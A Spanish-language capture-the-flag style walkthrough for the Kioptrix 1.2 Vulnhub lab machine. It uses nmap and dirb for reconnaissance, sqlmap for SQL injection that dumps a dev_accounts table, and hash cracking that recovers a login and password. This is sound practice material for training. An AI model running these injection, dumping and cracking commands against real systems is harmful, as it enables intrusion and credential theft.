<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=F7F400&width=390&height=80&lines=KIOPTRIX_1.2"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/kioptrix-level-12-3,24/

<h1 align="center"></h1>

</br>

- *Paso 1:* Identificar la IP de la máquina host con Arp-Scan. 
```
arp-scan --interface wlan0 -l
```
![1](https://user-images.githubusercontent.com/75953873/177891939-07f2e077-4b7a-4f04-9e6f-80c2e43d1a13.png)

IP host: `192.168.1.4`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.4
```
![2](https://user-images.githubusercontent.com/75953873/177892039-39832af6-5bbd-4ba1-9581-85abf27bffa0.png)

Puertos abiertos: [22,80]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 22,80 -A 192.168.1.4
```
![3](https://user-images.githubusercontent.com/75953873/177892640-8cd728ec-bbdd-4f6c-a2ec-2d1a55a17fa4.png)

Servidor corriendo: **HTTP Apache**

O.S: **Linux**

Modificar registro de DNS:
```
sudo nano /etc/hosts
192.168.1.4     kioptrix3.com
```
![5](https://user-images.githubusercontent.com/75953873/177894609-f8736c6f-88f5-4589-8537-b830f3aea646.png)

URL: `kioptrix3.com`

![4](https://user-images.githubusercontent.com/75953873/177894662-86f2e2d9-11d0-4e68-9d8b-eea8d94020b3.png)
 
- *Paso 4:* Enumerar directorios con Dirb. 
```
dirb http://kioptrix3.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![8](https://user-images.githubusercontent.com/75953873/177896088-d5bd5588-f32e-4391-ba4c-b3eb77cd2cfa.png)

```
dirb http://kioptrix3.com/gallery -X .php
```
![9](https://user-images.githubusercontent.com/75953873/177896489-33c3d635-4b79-4885-959f-ee23c9f644ee.png)

URL: `http://kioptrix3.com/gallery/gallery.php?id=1'`

![10](https://user-images.githubusercontent.com/75953873/177896633-3865f18f-a058-4598-a58b-a8172b935124.png)

- *Paso 4:* Inyección SQL con Sqlmap.
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs --batch
```
![11](https://user-images.githubusercontent.com/75953873/177897124-cea5badf-f09c-4cfa-beec-997462e2655c.png)

Enumerar base de datos `gallery`:
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery --dump --batch
```
![12](https://user-images.githubusercontent.com/75953873/177897559-e09a4acd-cad1-4bed-8435-5ba220183ab2.png)

Imprimir tablas `dev_accounts`:
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery -T dev_accounts --dump --batch
```
![13](https://user-images.githubusercontent.com/75953873/177898181-fd42d4ba-e68a-4e0e-9257-b82883f0c1e8.png)

- *Paso 5:* Identificar hash y crackearlo.
```
hash-identifier
```
![15](https://user-images.githubusercontent.com/75953873/177899147-49dace0d-0eac-4835-8f1a-0e86660302c9.png)

Tipo de hash: **MD5**

Crackearlo con hashCRACK:

Herramienta: https://github.com/R3LI4NT/hashCrack
```
python3 hashcrack.py --md5 5badcaf789d3d1d09794d8f021f40f0e -w /usr/share/wordlists/rockyou.txt
```
![14](https://user-images.githubusercontent.com/75953873/177899361-55ca89ae-2c96-4ac8-a1df-2a2680b3f125.png)

Usuario: `loneferret`

Contraseña: `starwars`
